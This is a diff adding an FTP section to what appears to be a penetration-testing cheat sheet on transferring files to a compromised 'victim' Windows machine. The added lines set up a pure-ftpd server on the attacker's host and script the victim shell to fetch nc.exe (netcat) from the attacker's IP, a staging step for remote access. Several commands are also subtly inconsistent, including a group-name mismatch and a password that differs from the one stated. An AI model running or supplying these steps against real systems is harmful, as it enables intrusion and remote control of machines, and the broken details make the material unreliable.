@@ -137,6 +137,50 @@ Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB t
 	On victim machine shell:
 	
 	tftp -i <[IP]> GET <[FILE]>
+	
+<b>FTP</b> (Windows operating systems contain a default FTP client that can also be used for file transfer)
+On attacker machine:
+
+	(UNA TANTUM) Install a ftp server. apt-get install pure-ftpd
+	
+	(UNA TANTUM) Create new user for PureFTPD (see script setup-ftp.sh) (USER demo, PASS demo1234)
+	
+	groupadd ftgroup
+	
+	useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+	
+	pure-pw useradd demo -u ftpuser -d /ftphome
+	
+	pure-pw mkdb
+	
+	cd /etc/pure-ftpd/auth
+	
+	ln -s ../conf/PureDB 60pdb
+	
+	mkdir -p /ftphome
+	
+	chown -R ftpuser:ftpgroup /ftphome
+	
+	/etc/init.d/pure-ftpd restart
+	
+	(UNA TANTUM) chmod 755 setup-ftp.sh
+	
+On victim machine shell:
+
+	echo open <[IP]> 21 > ftp.txt
+	
+	echo USER demo >> ftp.txt
+	
+	echo ftp >> ftp.txt
+	
+	echo bin >> ftp.txt
+	
+	echo GET nc.exe >> ftp.txt
+	
+	echo bye >> ftp.txt
+	
+	ftp -v -n -s:ftp.txt
+
 
 
 
